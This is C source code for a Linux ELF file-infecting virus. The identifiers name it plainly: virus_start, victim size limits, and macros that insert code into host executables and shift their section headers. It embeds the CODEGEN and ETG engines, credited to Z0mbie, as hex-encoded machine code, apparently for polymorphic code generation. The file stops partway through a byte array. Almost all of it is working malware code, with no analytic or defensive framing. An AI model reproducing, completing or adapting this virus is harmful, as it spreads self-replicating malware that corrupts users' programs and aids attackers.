#include <elf.h>
#include <stdint.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <linux/types.h>
#include <linux/dirent.h>

asm(".globl fake_host; fake_host: mov $1,%eax; mov $0, %ebx; int $0x80");

typedef struct {
	uint32_t layer1_addr, layer1_size;
	uint32_t layer2_addr, layer2_size;
	uint32_t random, seed, trash;
	char *lastbrk, *savebrk;
} globals;
register globals *g asm("ebp");

extern void virus_start;
extern void virus_end(void);
asm(".globl virus_start; virus_start: call virus; .byte 0x68; .long fake_host; ret");

#include "syscalls.h"
#ifdef	DEBUG
#include "debug.c"
#endif

#define	MIN_VICTIM_SIZE	1024
#define	MAX_VICTIM_SIZE	1024*1024
#define	ELFOSABI_TARGET	ELFOSABI_LINUX
#define	PAGE_SIZE	4096

#define	MAKE_HOLE(off,size) do {			\
	ftruncate(h,l+size);				\
	m = (char*)mremap(m,l,l + size, 0);		\
	if (m == MAP_FAILED) {				\
		goto _close;				\
	}						\
	if (off < l)					\
		memmove(m+off+size, m+off, l-off);	\
	l += size;					\
} while(0)
#define	SHIFT_SHDRS(offset,delta) do {			\
	if (ehdr->e_shoff >= offset)			\
		ehdr->e_shoff += delta;			\
	shdr = (Elf32_Shdr*)(m + ehdr->e_shoff);	\
	for (i = 0; i < ehdr->e_shnum; i++)		\
		if (shdr[i].sh_offset >= offset)	\
			shdr[i].sh_offset += delta;	\
} while(0)

static uint32_t crc32c_intel(uint32_t crc, uint8_t data)
{
	int i;
	crc ^= data;
	for (i = 0; i < 8; i++)
		crc = (crc >> 1) ^ ((crc & 1) ? 0x82F63B78 : 0);
	return crc;
}

static void memcpy(char *dst, char *src, int len)
{
	int i;
	for (i = 0; i < len; i++)
		*dst++ = *src++;
}

static void bzero(void *dst, int size)
{
	int i;
	for (i = 0; i < size; i++)
		*((char*)dst + i) = 0;
}

static int strcmp(const char *s1, const char *s2)
{
	int ret = 0;
	while (!(ret = *(unsigned char *) s1 - *(unsigned char *) s2) && *s2)
		++s1, ++s2;
	if (ret < 0)
		ret = -1;
	else
		if (ret > 0)
	        	ret = 1 ;
	return ret;
}

static void memmove(void *dst_void, void *src_void, int len)
{
	char *dst = dst_void;
	char *src = src_void;
	if (src < dst && dst < src + len) {
		src += len;
		dst += len;
		while (len--)
			*--dst = *--src;
	} else {
		while (len--)
			*dst++ = *src++;
	}
}

static char *sbrk(int inc)
{
	char *r;
	if (g->lastbrk == NULL) {
		g->lastbrk = (char*)brk(0);
		g->savebrk = g->lastbrk;
	}
	r = g->lastbrk;
	g->lastbrk = (char*)brk(g->lastbrk + inc);
	if (g->lastbrk != (r + inc))
		return (char*)-1;
	return r;
}

static unsigned long elf_hash(const unsigned char *name) {
	unsigned long h = 0, g;
	while (*name) {
		h = (h << 4) + *name++;
		if (g = h & 0xf0000000)
			h ^= g >> 24;
		h &= ~g;
	}
	return h;
}

static void build_hash(uint32_t *hash, int nbuckets, int nchains, Elf32_Sym *sym, char *str) {
	uint32_t i, h, *buckets, *chains;
	buckets = hash + 2;
	chains  = buckets + nbuckets;
	hash[0] = nbuckets;
	hash[1] = nchains;
	for (i = 1; i < nchains; i++) {
		h = elf_hash(str + sym[i].st_name) % nbuckets;
		if (buckets[h] == 0)
			buckets[h] = i;
		else {
			h = buckets[h];
			while (chains[h] != 0)
				h = chains[h];
			chains[h] = i;
		}
	}
}

/* CODEGEN/ETG engines by Z0mbie */
#define cmd_v_c         0       // cmd,v,c
#define cmd_v_v         1       // cmd,v1,v2
#define cmd_v_memv      2       // cmd,v1,[v2]
#define cmd_memv_v      3       // cmd,[v1],v2
#define cmd_r_r         4       // cmd,r1,r2
#define cmd_r_c         5       // cmd,r,c
#define cmd_r_memr      6       // cmd,r1,[r2]
#define cmd_memr_r      7       // cmd,[r1],r2
#define cmd_r_v         8       // cmd,r,v
#define cmd_v_r         9       // cmd,v,r
// cmd means one of the following:
#define cmd_mov         0
#define cmd_add         1
#define cmd_sub         2
#define cmd_xor         3
#define cmd_cmp         4
// v means offset
// r means 32-bit register # (0..7)
// c means dword-const
extern int cg();
asm("cg:");
asm(".byte 0xC8,0x00,0x00,0x00,0x60,0x8B,0x7D,0x0C,0x8B,0x45,0x28,0xC7,0x45,0x28,0x8B,0x00");
asm(".byte 0x00,0x00,0x0B,0xC0,0x74,0x28,0xC7,0x45,0x28,0x03,0x00,0x00,0x00,0x48,0x74,0x1E");
asm(".byte 0xC7,0x45,0x28,0x2B,0x00,0x00,0x00,0x48,0x74,0x14,0xC7,0x45,0x28,0x33,0x00,0x00");
asm(".byte 0x00,0x48,0x74,0x0A,0xC7,0x45,0x28,0x3B,0x00,0x00,0x00,0x48,0x75,0x63,0x8B,0x45");
asm(".byte 0x24,0xFF,0x75,0x28,0xFF,0x75,0x2C,0xFF,0x75,0x30,0xE8,0x0B,0x00,0x00,0x00,0x2B");
asm(".byte 0x7D,0x0C,0x8B,0x45,0x10,0x89,0x38,0x61,0xC9,0xC3,0x0B,0xC0,0x0F,0x84,0x77,0x04");
asm(".byte 0x00,0x00,0x48,0x0F,0x84,0xDF,0x04,0x00,0x00,0x48,0x0F,0x84,0x6F,0x05,0x00,0x00");
asm(".byte 0x48,0x0F,0x84,0x92,0x05,0x00,0x00,0x48,0x0F,0x84,0x14,0x01,0x00,0x00,0x48,0x0F");
asm(".byte 0x84,0xA9,0x01,0x00,0x00,0x48,0x0F,0x84,0xA3,0x02,0x00,0x00,0x48,0x0F,0x84,0xE2");
asm(".byte 0x02,0x00,0x00,0x48,0x0F,0x84,0x23,0x03,0x00,0x00,0x48,0x0F,0x84,0xA9,0x03,0x00");
asm(".byte 0x00,0xCC,0xC3,0x83,0x7D,0x1C,0x00,0x74,0x12,0x60,0xFF,0x75,0x14,0x57,0xFF,0x75");
asm(".byte 0x08,0xFF,0x55,0x1C,0x83,0xC4,0x0C,0x89,0x04,0x24,0x61,0xC3,0x60,0x50,0xFF,0x75");
asm(".byte 0x08,0xFF,0x55,0x20,0x83,0xC4,0x08,0x89,0x44,0x24,0x1C,0x61,0x0B,0xC0,0xC3,0xB8");
asm(".byte 0x02,0x00,0x00,0x00,0xEB,0xE6,0xB8,0x03,0x00,0x00,0x00,0xEB,0xDF,0xB8,0x08,0x00");
asm(".byte 0x00,0x00,0xEB,0xD8,0xB8,0x00,0x01,0x00,0x00,0xEB,0xD1,0x50,0xE8,0xF3,0xFF,0xFF");
asm(".byte 0xFF,0x88,0x04,0x24,0xE8,0xEB,0xFF,0xFF,0xFF,0x88,0x44,0x24,0x01,0xE8,0xE2,0xFF");
asm(".byte 0xFF,0xFF,0x88,0x44,0x24,0x02,0xE8,0xD9,0xFF,0xFF,0xFF,0x88,0x44,0x24,0x03,0x58");
asm(".byte 0xC3,0x83,0x7D,0x14,0x00,0x74,0x8A,0xE8,0xC1,0xFF,0xFF,0xFF,0x0F,0xB3,0x45,0x14");
asm(".byte 0x73,0xF5,0xC3,0x8B,0x44,0x24,0x04,0x0F,0xAB,0x45,0x14,0x0F,0x82,0x70,0xFF,0xFF");
asm(".byte 0xFF,0xC2,0x04,0x00,0x83,0x7D,0x14,0x00,0x74,0x2B,0xE8,0x97,0xFF,0xFF,0xFF,0x75");
asm(".byte 0x24,0xE8,0xCB,0xFF,0xFF,0xFF,0x51,0x91,0x68,0x8B,0x00,0x00,0x00,0x51,0xFF,0x74");
asm(".byte 0x24,0x10,0xE8,0x3B,0x00,0x00,0x00,0xFF,0x74,0x24,0x08,0xE8,0xC3,0xFF,0xFF,0xFF");
asm(".byte 0x89,0x4C,0x24,0x08,0x59,0xC3,0xE8,0xA6,0xFF,0xFF,0xFF,0x93,0xC3,0xE8,0x9F,0xFF");
asm(".byte 0xFF,0xFF,0x96,0xC3,0x53,0xE8,0xA9,0xFF,0xFF,0xFF,0xC3,0x56,0xE8,0xA2,0xFF,0xFF");
asm(".byte 0xFF,0xC3,0x53,0xE8,0xAC,0xFF,0xFF,0xFF,0x5B,0xC3,0x56,0xE8,0xA4,0xFF,0xFF,0xFF");
asm(".byte 0x5E,0xC3,0x8A,0x44,0x24,0x0C,0x3C,0x8B,0x74,0x3F,0xE8,0x30,0xFF,0xFF,0xFF,0x74");
asm(".byte 0x1B,0x8A,0x44,0x24,0x0C,0xAA,0x8A,0x44,0x24,0x08,0xC0,0xE0,0x03,0x0A,0x44,0x24");
asm(".byte 0x04,0x0C,0xC0,0xAA,0xE8,0xEA,0xFE,0xFF,0xFF,0xC2,0x0C,0x00,0x8A,0x44,0x24,0x0C");
asm(".byte 0x34,0x02,0xAA,0x8A,0x44,0x24,0x04,0xC0,0xE0,0x03,0x0A,0x44,0x24,0x08,0x0C,0xC0");
asm(".byte 0xAA,0xE8,0xCD,0xFE,0xFF,0xFF,0xC2,0x0C,0x00,0xE8,0xF1,0xFE,0xFF,0xFF,0x74,0xBA");
asm(".byte 0xB0,0x50,0x0A,0x44,0x24,0x04,0xAA,0xE8,0xB7,0xFE,0xFF,0xFF,0xB0,0x58,0x0A,0x44");
asm(".byte 0x24,0x08,0xAA,0xE8,0xAB,0xFE,0xFF,0xFF,0xC2,0x0C,0x00,0xB0,0xB8,0x0A,0x44,0x24");
asm(".byte 0x08,0xAA,0x8B,0x44,0x24,0x04,0xAB,0xE8,0x08,0x00,0x00,0x00,0xE8,0x92,0xFE,0xFF");
asm(".byte 0xFF,0xC2,0x08,0x00,0x83,0x7D,0x18,0x00,0x74,0x13,0x83,0xEF,0x04,0x60,0x50,0x57");
asm(".byte 0xFF,0x75,0x08,0xFF,0x55,0x18,0x83,0xC4,0x0C,0x89,0x04,0x24,0x61,0xC3,0x8A,0x44");
asm(".byte 0x24,0x0C,0x3C,0x8B,0x74,0x33,0xB0,0x81,0xAA,0x8A,0x44,0x24,0x0C,0x3C,0x33,0xB4");
asm(".byte 0xF0,0x74,0x12,0x3C,0x03,0xB4,0xC0,0x74,0x0C,0x3C,0x2B,0xB4,0xE8,0x74,0x06,0x3C");
asm(".byte 0x3B,0xB4,0xF8,0x74,0x00,0x8A,0xC4,0x0A,0x44,0x24,0x08,0xAA,0x8B,0x44,0x24,0x04");
asm(".byte 0xAB,0xE8,0x3D,0xFE,0xFF,0xFF,0xC2,0x0C,0x00,0xB8,0x05,0x00,0x00,0x00,0xE8,0x49");
asm(".byte 0xFE,0xFF,0xFF,0x74,0x29,0x48,0x74,0x3A,0x48,0x74,0x62,0x48,0x0F,0x84,0x84,0x00");
asm(".byte 0x00,0x00,0xB0,0x68,0xAA,0x8B,0x44,0x24,0x04,0xAB,0xE8,0x14,0xFE,0xFF,0xFF,0xB0");
asm(".byte 0x58,0x0A,0x44,0x24,0x08,0xAA,0xE8,0x08,0xFE,0xFF,0xFF,0xC2,0x0C,0x00,0xB0,0xB8");
asm(".byte 0x0A,0x44,0x24,0x08,0xAA,0x8B,0x44,0x24,0x04,0xAB,0xE8,0xF4,0xFD,0xFF,0xFF,0xC2");
asm(".byte 0x0C,0x00,0xE8,0x34,0xFE,0xFF,0xFF,0x50,0x2B,0x44,0x24,0x08,0xF7,0xD8,0x68,0x8B");
asm(".byte 0x00,0x00,0x00,0xFF,0x74,0x24,0x10,0x50,0xE8,0x61,0xFF,0xFF,0xFF,0x58,0x6A,0x03");
asm(".byte 0xFF,0x74,0x24,0x0C,0x50,0xE8,0x54,0xFF,0xFF,0xFF,0xC2,0x0C,0x00,0xE8,0x09,0xFE");
asm(".byte 0xFF,0xFF,0x50,0x03,0x44,0x24,0x08,0x68,0x8B,0x00,0x00,0x00,0xFF,0x74,0x24,0x10");
asm(".byte 0x50,0xE8,0x38,0xFF,0xFF,0xFF,0x58,0x6A,0x2B,0xFF,0x74,0x24,0x0C,0x50,0xE8,0x2B");
asm(".byte 0xFF,0xFF,0xFF,0xC2,0x0C,0x00,0xE8,0xE0,0xFD,0xFF,0xFF,0x50,0x33,0x44,0x24,0x08");
asm(".byte 0x68,0x8B,0x00,0x00,0x00,0xFF,0x74,0x24,0x10,0x50,0xE8,0x0F,0xFF,0xFF,0xFF,0x58");
asm(".byte 0x6A,0x33,0xFF,0x74,0x24,0x0C,0x50,0xE8,0x02,0xFF,0xFF,0xFF,0xC2,0x0C,0x00,0x8A");
asm(".byte 0x44,0x24,0x0C,0x3C,0x8B,0x74,0x19,0x8A,0x44,0x24,0x0C,0xAA,0x8A,0x44,0x24,0x08");
asm(".byte 0xC0,0xE0,0x03,0x0A,0x44,0x24,0x04,0xAA,0xE8,0x56,0xFD,0xFF,0xFF,0xC2,0x0C,0x00");
asm(".byte 0xE8,0x7A,0xFD,0xFF,0xFF,0x74,0xE0,0xB0,0xFF,0xAA,0xB0,0x30,0x0A,0x44,0x24,0x04");
asm(".byte 0xAA,0xE8,0x3D,0xFD,0xFF,0xFF,0xB0,0x58,0x0A,0x44,0x24,0x08,0xAA,0xE8,0x31,0xFD");
asm(".byte 0xFF,0xFF,0xC2,0x0C,0x00,0x8A,0x44,0x24,0x0C,0x3C,0x8B,0x74,0x1B,0x8A,0x44,0x24");
asm(".byte 0x0C,0x34,0x02,0xAA,0x8A,0x44,0x24,0x04,0xC0,0xE0,0x03,0x0A,0x44,0x24,0x08,0xAA");
asm(".byte 0xE8,0x0E,0xFD,0xFF,0xFF,0xC2,0x0C,0x00,0xE8,0x32,0xFD,0xFF,0xFF,0x74,0xDE,0xB0");
asm(".byte 0x50,0x0A,0x44,0x24,0x04,0xAA,0xE8,0xF8,0xFC,0xFF,0xFF,0xB0,0x8F,0xAA,0x32,0xC0");
asm(".byte 0x0A,0x44,0x24,0x08,0xAA,0xE8,0xE9,0xFC,0xFF,0xFF,0xC2,0x0C,0x00,0xE8,0x0D,0xFD");
asm(".byte 0xFF,0xFF,0x74,0x54,0x8A,0x44,0x24,0x0C,0x3C,0x8B,0x74,0x21,0x8A,0x44,0x24,0x0C");
asm(".byte 0xAA,0x8B,0x44,0x24,0x08,0xC0,0xE0,0x03,0x0C,0x05,0xAA,0x8B,0x44,0x24,0x04,0xAB");
asm(".byte 0xE8,0x2F,0xFE,0xFF,0xFF,0xE8,0xB9,0xFC,0xFF,0xFF,0xC2,0x0C,0x00,0xE8,0xDD,0xFC");
asm(".byte 0xFF,0xFF,0x74,0xD8,0x66,0xB8,0xFF,0x35,0x66,0xAB,0x8B,0x44,0x24,0x04,0xAB,0xE8");
asm(".byte 0x10,0xFE,0xFF,0xFF,0xE8,0x9A,0xFC,0xFF,0xFF,0xB0,0x58,0x0A,0x44,0x24,0x08,0xAA");
asm(".byte 0xE8,0x8E,0xFC,0xFF,0xFF,0xC2,0x0C,0x00,0x83,0x7D,0x14,0x00,0x74,0xA6,0x53,0xE8");
asm(".byte 0x42,0xFD,0xFF,0xFF,0x53,0xFF,0x74,0x24,0x0C,0xE8,0xCD,0xFD,0xFF,0xFF,0xE8,0x4F");
asm(".byte 0xFD,0xFF,0xFF,0xFF,0x74,0x24,0x10,0xFF,0x74,0x24,0x10,0x53,0xE8,0xEE,0xFE,0xFF");
asm(".byte 0xFF,0xE8,0x2E,0xFD,0xFF,0xFF,0x5B,0xC2,0x0C,0x00,0xE8,0x80,0xFC,0xFF,0xFF,0x74");
asm(".byte 0x56,0x8A,0x44,0x24,0x0C,0x3C,0x8B,0x74,0x23,0x8A,0x44,0x24,0x0C,0x34,0x02,0xAA");
asm(".byte 0x8B,0x44,0x24,0x04,0xC0,0xE0,0x03,0x0C,0x05,0xAA,0x8B,0x44,0x24,0x08,0xAB,0xE8");
asm(".byte 0xA0,0xFD,0xFF,0xFF,0xE8,0x2A,0xFC,0xFF,0xFF,0xC2,0x0C,0x00,0xE8,0x4E,0xFC,0xFF");
asm(".byte 0xFF,0x74,0xD6,0xB0,0x50,0x0A,0x44,0x24,0x04,0xAA,0xE8,0x14,0xFC,0xFF,0xFF,0x66");
asm(".byte 0xB8,0x8F,0x05,0x66,0xAB,0x8B,0x44,0x24,0x08,0xAB,0xE8,0x75,0xFD,0xFF,0xFF,0xE8");
asm(".byte 0xFF,0xFB,0xFF,0xFF,0xC2,0x0C,0x00,0x83,0x7D,0x14,0x00,0x74,0xA4,0x53,0xE8,0xB3");
asm(".byte 0xFC,0xFF,0xFF,0x53,0xFF,0x74,0x24,0x10,0xE8,0x3E,0xFD,0xFF,0xFF,0xE8,0xC0,0xFC");
asm(".byte 0xFF,0xFF,0xFF,0x74,0x24,0x10,0x53,0xFF,0x74,0x24,0x10,0xE8,0xA5,0xFE,0xFF,0xFF");
asm(".byte 0xE8,0x9F,0xFC,0xFF,0xFF,0x5B,0xC2,0x0C,0x00,0xE8,0xF1,0xFB,0xFF,0xFF,0x74,0x31");
asm(".byte 0x8A,0x44,0x24,0x0C,0x3C,0x8B,0x75,0x08,0x66,0xB8,0xC7,0x05,0x66,0xAB,0xEB,0x0A");
asm(".byte 0xB0,0x81,0xAA,0x8A,0x44,0x24,0x0C,0x04,0x02,0xAA,0x8B,0x44,0x24,0x08,0xAB,0xE8");
asm(".byte 0x10,0xFD,0xFF,0xFF,0x8B,0x44,0x24,0x04,0xAB,0xE8,0x95,0xFB,0xFF,0xFF,0xC2,0x0C");
asm(".byte 0x00,0x83,0x7D,0x14,0x00,0x74,0xC9,0x53,0xE8,0x49,0xFC,0xFF,0xFF,0x68,0x8B,0x00");
asm(".byte 0x00,0x00,0x53,0xFF,0x74,0x24,0x10,0xE8,0x02,0xFD,0xFF,0xFF,0xE8,0x51,0xFC,0xFF");
asm(".byte 0xFF,0xFF,0x74,0x24,0x10,0xFF,0x74,0x24,0x10,0x53,0xE8,0x0B,0xFF,0xFF,0xFF,0xE8");
asm(".byte 0x30,0xFC,0xFF,0xFF,0x5B,0xC2,0x0C,0x00,0xE8,0x89,0xFB,0xFF,0xFF,0x74,0x4E,0x48");
asm(".byte 0x74,0x21,0x56,0xFF,0x74,0x24,0x08,0xE8,0x1A,0x01,0x00,0x00,0xFF,0x74,0x24,0x10");
asm(".byte 0xFF,0x74,0x24,0x10,0x56,0xE8,0xE0,0xFE,0xFF,0xFF,0xE8,0x0C,0xFC,0xFF,0xFF,0x5E");
asm(".byte 0xC2,0x0C,0x00,0x53,0x56,0xFF,0x74,0x24,0x10,0xFF,0x74,0x24,0x18,0xE8,0xB5,0x00");
asm(".byte 0x00,0x00,0xFF,0x74,0x24,0x0C,0xE8,0xEB,0x00,0x00,0x00,0xFF,0x74,0x24,0x14,0x53");
asm(".byte 0x56,0xE8,0xFC,0xFB,0xFF,0xFF,0xE8,0xE0,0xFB,0xFF,0xFF,0xEB,0x1D,0x53,0x56,0xFF");
asm(".byte 0x74,0x24,0x10,0xFF,0x74,0x24,0x18,0xE8,0x8B,0x00,0x00,0x00,0xFF,0x74,0x24,0x14");
asm(".byte 0x53,0xFF,0x74,0x24,0x14,0xE8,0x03,0xFE,0xFF,0xFF,0x80,0x7C,0x24,0x14,0x3B,0x74");
asm(".byte 0x14,0xE8,0xBC,0xFB,0xFF,0xFF,0x68,0x8B,0x00,0x00,0x00,0xFF,0x74,0x24,0x14,0x53");
asm(".byte 0xE8,0x75,0xFE,0xFF,0xFF,0xE8,0x9A,0xFB,0xFF,0xFF,0x5E,0x5B,0xC2,0x0C,0x00,0x53");
asm(".byte 0x56,0xFF,0x74,0x24,0x10,0xFF,0x74,0x24,0x18,0xE8,0x49,0x00,0x00,0x00,0xFF,0x74");
asm(".byte 0x24,0x0C,0xE8,0x7F,0x00,0x00,0x00,0xFF,0x74,0x24,0x14,0x53,0x56,0xE8,0x2D,0xFD");
asm(".byte 0xFF,0xFF,0xE8,0x74,0xFB,0xFF,0xFF,0xEB,0xB1,0x53,0x56,0xFF,0x74,0x24,0x10,0xE8");
asm(".byte 0x46,0x00,0x00,0x00,0xFF,0x74,0x24,0x0C,0xE8,0x59,0x00,0x00,0x00,0xFF,0x74,0x24");
asm(".byte 0x14,0x53,0x56,0xE8,0x4D,0xFD,0xFF,0xFF,0xE8,0x47,0xFB,0xFF,0xFF,0xE8,0x49,0xFB");
asm(".byte 0xFF,0xFF,0x5E,0x5B,0xC2,0x0C,0x00,0xE8,0x2A,0xFB,0xFF,0xFF,0x80,0x7C,0x24,0x04");
asm(".byte 0x8B,0x74,0x14,0x68,0x8B,0x00,0x00,0x00,0x53,0xFF,0x74,0x24,0x10,0xE8,0x6B,0xFD");
asm(".byte 0xFF,0xFF,0xE8,0x2B,0xFB,0xFF,0xFF,0xC2,0x08,0x00,0xE8,0x07,0xFB,0xFF,0xFF,0x68");
asm(".byte 0x8B,0x00,0x00,0x00,0x53,0xFF,0x74,0x24,0x0C,0xE8,0x4F,0xFD,0xFF,0xFF,0xE8,0x0F");
asm(".byte 0xFB,0xFF,0xFF,0xC2,0x04,0x00,0xE8,0xF2,0xFA,0xFF,0xFF,0x68,0x8B,0x00,0x00,0x00");
asm(".byte 0x56,0xFF,0x74,0x24,0x0C,0xE8,0x33,0xFD,0xFF,0xFF,0xE8,0xFB,0xFA,0xFF,0xFF,0xC2");
asm(".byte 0x04,0x00");
#define ETG_MOVRR       0x00000001
#define ETG_MOVRC       0x00000002
#define ETG_MOVSXZX     0x00000004
#define ETG_XCHG        0x00000008
#define ETG_LEA         0x00000010
#define ETG_TTTRR       0x00000020
#define ETG_TTTRC       0x00000040
#define ETG_INCDEC      0x00000080
#define ETG_NOTNEG      0x00000100
#define ETG_TESTRR      0x00000200
#define ETG_TESTRC      0x00000400
#define ETG_IMUL        0x00000800
#define ETG_SHIFT       0x00001000
#define ETG_SHxD        0x00002000
#define ETG_BSWAP       0x00004000
#define ETG_XADD        0x00008000
#define ETG_BSx         0x00010000
#define ETG_BTx         0x00020000
#define ETG_JMPS        0x00040000
#define ETG_SEG         0x00080000
#define ETG_REP         0x00100000
#define ETG_ALL         0x001FFFFF
#define REG_EAX         0x00000001
#define REG_ECX         0x00000002
#define REG_EDX         0x00000004
#define REG_EBX         0x00000008
#define REG_ESP         0x00000010
#define REG_EBP         0x00000020
#define REG_ESI         0x00000040
#define REG_EDI         0x00000080
#define REG_ALL         ((~REG_ESP)&0xFF)
extern uint8_t *etg();
asm("etg:");
asm(".byte 0xC8,0x50,0x00,0x00,0x60,0x8B,0x7D,0x24,0xFC,0x81,0x65,0x10,0xEF,0x00,0x00,0x00");
asm(".byte 0x75,0x07,0xC7,0x45,0x10,0x01,0x00,0x00,0x00,0x81,0x65,0x14,0xEF,0x00,0x00,0x00");
asm(".byte 0x75,0x07,0xC7,0x45,0x14,0x01,0x00,0x00,0x00,0x81,0x65,0x0C,0xFF,0xFF,0x1F,0x00");
asm(".byte 0x75,0x07,0xC7,0x45,0x0C,0x40,0x00,0x00,0x00,0x8B,0xC7,0x2B,0x45,0x24,0x8B,0x4D");
asm(".byte 0x18,0x89,0x01,0x83,0xC0,0x10,0x3B,0x45,0x20,0x73,0x0C,0xFF,0x4D,0x1C,0x7C,0x07");
asm(".byte 0xE8,0x05,0x00,0x00,0x00,0xEB,0xE2,0x61,0xC9,0xC3,0xC7,0x45,0xFC,0x01,0x00,0x00");
asm(".byte 0x00,0xC7,0x45,0xF8,0x08,0x00,0x00,0x00,0xE8,0xE4,0x03,0x00,0x00,0x89,0x45,0xC8");
asm(".byte 0xC1,0xE0,0x03,0x89,0x45,0xC4,0xE8,0xD1,0x03,0x00,0x00,0x89,0x45,0xC0,0xC1,0xE0");
asm(".byte 0x03,0x89,0x45,0xBC,0x8B,0x45,0x14,0x23,0x45,0x10,0xA9,0x0F,0x00,0x00,0x00,0x74");
asm(".byte 0x13,0xB8,0x02,0x00,0x00,0x00,0xE8,0x93,0x03,0x00,0x00,0x89,0x45,0xFC,0xC1,0xE0");
asm(".byte 0x03,0x89,0x45,0xF8,0xB8,0x02,0x00,0x00,0x00,0xE8,0x80,0x03,0x00,0x00,0x89,0x45");
asm(".byte 0xDC,0xD1,0xE0,0x89,0x45,0xD8,0xC1,0xE0,0x02,0x89,0x45,0xD4,0xB8,0x04,0x00,0x00");
asm(".byte 0x00,0xE8,0x68,0x03,0x00,0x00,0xC1,0xE0,0x03,0x89,0x45,0xD0,0xE8,0x70,0x03,0x00");
asm(".byte 0x00,0xC1,0xE0,0x03,0x89,0x45,0xCC,0xE8,0x70,0x03,0x00,0x00,0x89,0x45,0xF4,0xC1");
asm(".byte 0xE0,0x03,0x89,0x45,0xE4,0xE8,0x62,0x03,0x00,0x00,0x89,0x45,0xEC,0xE8,0x5F,0x03");
asm(".byte 0x00,0x00,0x89,0x45,0xF0,0xC1,0xE0,0x03,0x89,0x45,0xE0,0xE8,0x51,0x03,0x00,0x00");
asm(".byte 0x89,0x45,0xE8,0xE8,0x4E,0x03,0x00,0x00,0x89,0x45,0xB8,0xC1,0xE0,0x03,0x89,0x45");
asm(".byte 0xB4,0xE8,0x40,0x03,0x00,0x00,0x89,0x45,0xB0,0xB8,0x1F,0x00,0x00,0x00,0xE8,0x0B");
asm(".byte 0x03,0x00,0x00,0x96,0x46,0x8B,0x55,0x0C,0x8B,0x45,0xFC,0xD1,0xEA,0x73,0x0E,0x4E");
asm(".byte 0x0F,0x84,0x27,0x01,0x00,0x00,0x4E,0x0F,0x84,0x2D,0x01,0x00,0x00,0xD1,0xEA,0x73");
asm(".byte 0x0E,0x4E,0x0F,0x84,0x2F,0x01,0x00,0x00,0x4E,0x0F,0x84,0x36,0x01,0x00,0x00,0xD1");
asm(".byte 0xEA,0x73,0x07,0x4E,0x0F,0x84,0x32,0x01,0x00,0x00,0xD1,0xEA,0x73,0x07,0x4E,0x0F");
asm(".byte 0x84,0x47,0x01,0x00,0x00,0xD1,0xEA,0x73,0x07,0x4E,0x0F,0x84,0x41,0x01,0x00,0x00");
asm(".byte 0xD1,0xEA,0x73,0x0E,0x4E,0x0F,0x84,0x44,0x01,0x00,0x00,0x4E,0x0F,0x84,0x45,0x01");
asm(".byte 0x00,0x00,0xD1,0xEA,0x73,0x0E,0x4E,0x0F,0x84,0x42,0x01,0x00,0x00,0x4E,0x0F,0x84");
asm(".byte 0x4C,0x01,0x00,0x00,0xD1,0xEA,0x73,0x0E,0x4E,0x0F,0x84,0x59,0x01,0x00,0x00,0x4E");
asm(".byte 0x0F,0x84,0x5F,0x01,0x00,0x00,0xD1,0xEA,0x73,0x07,0x4E,0x0F,0x84,0x5E,0x01,0x00");
asm(".byte 0x00,0xD1,0xEA,0x73,0x07,0x4E,0x0F,0x84,0x60,0x01,0x00,0x00,0xD1,0xEA,0x73,0x07");
asm(".byte 0x4E,0x0F,0x84,0x62,0x01,0x00,0x00,0xD1,0xEA,0x73,0x0E,0x4E,0x0F,0x84,0x65,0x01");
asm(".byte 0x00,0x00,0x4E,0x0F,0x84,0x6E,0x01,0x00,0x00,0xD1,0xEA,0x73,0x0E,0x4E,0x0F,0x84");
asm(".byte 0x70,0x01,0x00,0x00,0x4E,0x0F,0x84,0x79,0x01,0x00,0x00,0xD1,0xEA,0x73,0x0E,0x4E");
asm(".byte 0x0F,0x84,0x7F,0x01,0x00,0x00,0x4E,0x0F,0x84,0x97,0x01,0x00,0x00,0xD1,0xEA,0x73");
asm(".byte 0x07,0x4E,0x0F,0x84,0xA4,0x01,0x00,0x00,0xD1,0xEA,0x73,0x07,0x4E,0x0F,0x84,0xA0");
asm(".byte 0x01,0x00,0x00,0xD1,0xEA,0x73,0x07,0x4E,0x0F,0x84,0xA3,0x01,0x00,0x00,0xD1,0xEA");
asm(".byte 0x73,0x0E,0x4E,0x0F,0x84,0xA6,0x01,0x00,0x00,0x4E,0x0F,0x84,0xB0,0x01,0x00,0x00");
asm(".byte 0xD1,0xEA,0x73,0x07,0x4E,0x0F,0x84,0xB0,0x01,0x00,0x00,0xD1,0xEA,0x73,0x0E,0x4E");
asm(".byte 0x0F,0x84,0xB7,0x01,0x00,0x00,0x4E,0x0F,0x84,0xB7,0x01,0x00,0x00,0xD1,0xEA,0x73");
asm(".byte 0x07,0x4E,0x0F,0x84,0xB3,0x01,0x00,0x00,0xE9,0xBC,0xFE,0xFF,0xFF,0x0C,0x88,0xAA");
asm(".byte 0xB0,0xC0,0x0B,0x45,0xE4,0x0B,0x45,0xF0,0xAA,0xC3,0x0C,0x8A,0xAA,0xB0,0xC0,0x0B");
asm(".byte 0x45,0xE0,0x0B,0x45,0xF4,0xAA,0xC3,0xB0,0xB0,0x0B,0x45,0xF8,0x0B,0x45,0xF0,0xAA");
asm(".byte 0xE9,0x8D,0x01,0x00,0x00,0x0C,0xC6,0xAA,0xB0,0xC0,0xEB,0xF0,0xB0,0x0F,0xAA,0xB0");
asm(".byte 0xB6,0x0B,0x45,0xFC,0x0B,0x45,0xD4,0xAA,0xB0,0xC0,0x0B,0x45,0xC4,0xEB,0xD3,0x0C");
asm(".byte 0x86,0xAA,0xB0,0xC0,0x0B,0x45,0xE0,0x0B,0x45,0xE8,0xAA,0xC3,0x0C,0x86,0xAA,0xEB");
asm(".byte 0xF1,0xB0,0x8D,0xAA,0xB0,0x05,0x0B,0x45,0xC4,0xAA,0xE9,0x59,0x01,0x00,0x00,0x0C");
asm(".byte 0x00,0x0B,0x45,0xCC,0xAA,0xEB,0x99,0x0C,0x02,0x0B,0x45,0xCC,0xAA,0xEB,0x9E,0x0C");
asm(".byte 0x80,0xAA,0xB0,0xC0,0x0B,0x45,0xCC,0x0B,0x45,0xF0,0xAA,0xE9,0x32,0x01,0x00,0x00");
asm(".byte 0xF7,0x45,0x14,0x01,0x00,0x00,0x00,0x0F,0x84,0x2C,0xFE,0xFF,0xFF,0x0C,0x04,0x0B");
asm(".byte 0x45,0xCC,0xAA,0xE9,0x1A,0x01,0x00,0x00,0x0C,0xFE,0xAA,0xB0,0xC0,0x0B,0x45,0xD4");
asm(".byte 0xE9,0x60,0xFF,0xFF,0xFF,0xB0,0x40,0x0B,0x45,0xD4,0x0B,0x45,0xC8,0xAA,0xC3,0x0C");
